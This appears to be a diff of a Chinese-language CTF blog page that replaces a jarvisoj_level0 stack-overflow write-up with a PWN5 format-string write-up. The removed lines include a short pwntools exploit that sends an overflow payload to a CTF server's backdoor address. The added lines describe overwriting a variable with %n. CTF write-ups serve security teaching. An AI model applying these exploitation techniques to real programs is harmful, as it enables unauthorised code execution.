@@ -10,20 +10,21 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="jarvisoj_level0分析vulnerable_function函数  buf占用空间小于read函数可写入数据，可以使用栈溢出 找到后门函数地址  由于是64位程序，rsp应该占用8字节 可写出exp from pwn import * io &#x3D; remote(‘node4.buuoj.cn’, 28712)payload &#x3D; b’a‘*（0x80+8）+ p64(0">
+  <meta name="description" content="[第五空间2019 决赛]PWN5 有printf函数，可以利用格式化字符串漏洞 main函数作用是将输入数字与随机数对比，相同便可直接执行system函数。 可以将随机数修改为已知数从而得到flag  可以看到写入数据在栈的第十位 再找到随机数变量所在地址，便可写出exp  payload&#x3D;密码所在地址加%n 由于p32长四个字节，所以密码是4">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://shabbby.github.io/2023/01/22/jarvisoj_level0/index.html">
+<meta property="og:url" content="http://shabbby.github.io/2023/01/23/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="jarvisoj_level0分析vulnerable_function函数  buf占用空间小于read函数可写入数据，可以使用栈溢出 找到后门函数地址  由于是64位程序，rsp应该占用8字节 可写出exp from pwn import * io &#x3D; remote(‘node4.buuoj.cn’, 28712)payload &#x3D; b’a‘*（0x80+8）+ p64(0">
+<meta property="og:description" content="[第五空间2019 决赛]PWN5 有printf函数，可以利用格式化字符串漏洞 main函数作用是将输入数字与随机数对比，相同便可直接执行system函数。 可以将随机数修改为已知数从而得到flag  可以看到写入数据在栈的第十位 再找到随机数变量所在地址，便可写出exp  payload&#x3D;密码所在地址加%n 由于p32长四个字节，所以密码是4">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://shabbby.github.io/images/jarvisoj_level0/Snipaste_2023-01-23_00-54-04.png">
-<meta property="og:image" content="http://shabbby.github.io/images/jarvisoj_level0/Snipaste_2023-01-22_15-07-34-16743713614164.png">
-<meta property="article:published_time" content="2023-01-22T06:15:32.499Z">
-<meta property="article:modified_time" content="2023-01-22T17:06:59.421Z">
+<meta property="og:image" content="http://shabbby.github.io/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_19-18-10.png">
+<meta property="og:image" content="http://shabbby.github.io/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_20-29-31.png">
+<meta property="og:image" content="http://shabbby.github.io/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_21-21-45.png">
+<meta property="article:published_time" content="2023-01-23T10:20:02.046Z">
+<meta property="article:modified_time" content="2023-01-23T13:26:33.326Z">
 <meta property="article:author" content="Shabby">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://shabbby.github.io/images/jarvisoj_level0/Snipaste_2023-01-23_00-54-04.png">
+<meta name="twitter:image" content="http://shabbby.github.io/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_19-18-10.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -214,20 +215,21 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-jarvisoj_level0" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-[第五空间2019 决赛]PWN5" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>分析vulnerable_function函数</p>
-<p><img src="/images/jarvisoj_level0/Snipaste_2023-01-23_00-54-04.png"></p>
-<p>buf占用空间小于read函数可写入数据，可以使用栈溢出</p>
-<p>找到后门函数地址</p>
-<p><img src="/images/jarvisoj_level0/Snipaste_2023-01-22_15-07-34-16743713614164.png"></p>
-<p>由于是64位程序，rsp应该占用8字节</p>
-<p>可写出exp</p>
-<p>from pwn import *</p>
-<p>io &#x3D; remote(‘node4.buuoj.cn’, 28712)<br>payload &#x3D; b’a‘*（0x80+8）+ p64(0x400596)<br>io.sendline(payload)<br>io.interactive() </p>
+    <h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><p><img src="/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_19-18-10.png"></p>
+<p>有printf函数，可以利用格式化字符串漏洞</p>
+<p>main函数作用是将输入数字与随机数对比，相同便可直接执行system函数。</p>
+<p>可以将随机数修改为已知数从而得到flag</p>
+<p><img src="/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_20-29-31.png"></p>
+<p>可以看到写入数据在栈的第十位</p>
+<p>再找到随机数变量所在地址，便可写出exp</p>
+<p><img src="/images/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/Snipaste_2023-01-23_21-21-45.png"></p>
+<p>payload&#x3D;密码所在地址加%n</p>
+<p>由于p32长四个字节，所以密码是4</p>
 
     
 
@@ -274,7 +276,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://shabbby.github.io/2023/01/22/jarvisoj_level0/" title="" target="_blank">http://shabbby.github.io/2023/01/22/jarvisoj_level0/</a>
+          <a href="http://shabbby.github.io/2023/01/23/[第五空间2019 决赛]PWN5/" title="" target="_blank">http://shabbby.github.io/2023/01/23/[第五空间2019 决赛]PWN5/</a>
         </li>
         
         <li>
@@ -341,7 +343,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://shabbby.github.io/2023/01/22/jarvisoj_level0/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://shabbby.github.io/2023/01/23/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -356,17 +358,8 @@
 
 <nav id="article-nav">
   
-    <a href="/2023/01/23/%5B%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B%5DPWN5/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          (no title)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2023/01/21/pwn1_sctf_2016/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/01/22/jarvisoj_level0/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title"></div>
       <i class="icon-circle-right"></i>
     </a>
